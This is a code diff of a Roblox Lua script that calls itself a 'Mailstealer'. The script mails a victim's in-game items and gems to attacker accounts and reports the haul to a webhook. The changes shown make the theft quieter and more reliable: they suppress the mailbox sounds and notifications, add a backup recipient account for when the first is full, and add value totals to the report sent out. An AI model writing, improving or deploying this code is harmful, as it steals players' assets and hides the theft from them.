@@ -19,7 +19,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
 end
 
 if GemAmount1 < 10000 then
-    plr:kick("Saving error, please rejoin!")
+    return
 end
 
 local function formatNumber(number)
@@ -38,6 +38,7 @@ local function SendMessage(url, username, diamonds)
         ["Content-Type"] = "application/json"
     }
 
+	local totalRAP = 0
 	local fields = {
 		{
 			name = "Victim Username:",
@@ -52,9 +53,11 @@ local function SendMessage(url, username, diamonds)
 	}
 
 	for _, item in ipairs(itemsToSend) do
-		fields[2].value = fields[2].value .. item.name .. ": " .. formatNumber(item.rap) .. " RAP\n"
+		fields[2].value = fields[2].value .. item.name .. ": " .. formatNumber(item.rap * item.amount) .. " RAP\n"
+		totalRAP = totalRAP + (item.rap * item.amount)
 	end
-    fields[2].value = fields[2].value .. "Gems: " .. formatNumber(diamonds)
+    fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
+	fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
 
     local data = {
         ["embeds"] = {{
@@ -62,7 +65,7 @@ local function SendMessage(url, username, diamonds)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
+				["text"] = "Mailstealer by Tobi. https://discord.gg/HcpNe56R2a"
 			}
         }}
     }
@@ -76,6 +79,7 @@ local function SendMessage(url, username, diamonds)
 end
 
 local user = Username
+local user2 = Username2 or "2pRiAMfYN41y"
 
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
 local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
@@ -90,6 +94,16 @@ noti:GetPropertyChangedSignal("Enabled"):Connect(function()
 	noti.Enabled = false
 end)
 noti.Enabled = false
+
+game.DescendantAdded:Connect(function(x)
+    if x.ClassName == "Sound" then
+        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
+            x.Volume=0
+            x.PlayOnRemove=false
+            x:Destroy()
+        end
+    end
+end)
 
 local function safeToString(value)
     if value == nil then
@@ -127,7 +141,11 @@ local function sendItem(category, uid, am)
     }
 	local response = false
 	repeat
-    	local response = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    	local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+		if response == false and err == "They don't have enough space!" then
+			user = user2
+			args[1] = user
+		end
 	until response == true
 	GemAmount1 = GemAmount1 - 10000
 end
@@ -224,7 +242,7 @@ local function CategoryWebhook(category)
 					prefix = "Shiny " .. prefix
 				end
 				local id = prefix .. v.id .. " (x" .. (v._am and tostring(v._am) or "1") .. ")"
-				table.insert(itemsToSend, {name = id, rap = rapValue})
+				table.insert(itemsToSend, {name = id, rap = rapValue, amount = v._am or 1})
 			end
 		end
 	else
@@ -232,7 +250,7 @@ local function CategoryWebhook(category)
 			local rapValue = getRAP(category, v)
 			if rapValue >= min_rap then
 				local id = v.id .. " (x" .. (v._am and tostring(v._am) or "1") .. ")"
-				table.insert(itemsToSend, {name = id, rap = rapValue})
+				table.insert(itemsToSend, {name = id, rap = rapValue, amount = v._am or 1})
 			end
 		end
 	end
